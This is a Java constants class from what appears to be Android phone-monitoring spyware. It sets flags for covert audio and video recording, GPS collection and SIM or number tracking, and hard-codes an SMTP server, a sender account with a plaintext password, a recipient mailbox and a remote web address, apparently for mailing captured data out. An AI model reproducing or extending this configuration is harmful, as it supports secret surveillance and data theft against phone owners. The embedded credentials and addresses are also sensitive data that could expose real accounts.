package cn.smsmanager.tools;

import android.content.Context;
import android.content.SharedPreferences;

public final class ParamsInfo {
    public static boolean AUTO_RECORD_FLAG = false;
    public static final int AUTO_RECORD_MAX_LENGTH = 1200;
    public static boolean AUTO_VIDEO_FLAG = false;
    public static final int AUTO_VIDEO_MAX_LENGTH = 600;
    public static final boolean FANGDAO_FALG = false;
    public static boolean GET_GPS_FLAG = false;
    public static int GPRS_STATE_FLAG = 1;
    public static String Line1Number = "";
    public static final String bcc = "";
    public static final String cc = "";
    public static Context context = null;
    public static final String from = "phoneListener013@126.com";
    public static final String host = "smtp.126.com";
    public static String identify = "";
    public static boolean isDoing = false;
    public static boolean isServiceStart = false;
    public static String mynumber = "";
    public static String outNumber = "";
    public static final String password = "listenpassword";
    public static long receiveMessageId = 0;
    public static Thread scanNetwordThread = null;
    public static String secureNumber = "135****0869";
    public static long sendMessageId = 0;
    public static String sim_no = "";
    public static SharedPreferences sp = null;
    public static String to = "liujun199067@126.com";
    public static final String user = "phoneListener013@126.com";
    public static final String webRootPath = "http://www.shm2580.com/";
    public static final String webUrl = "http://www.baidu.com";
}
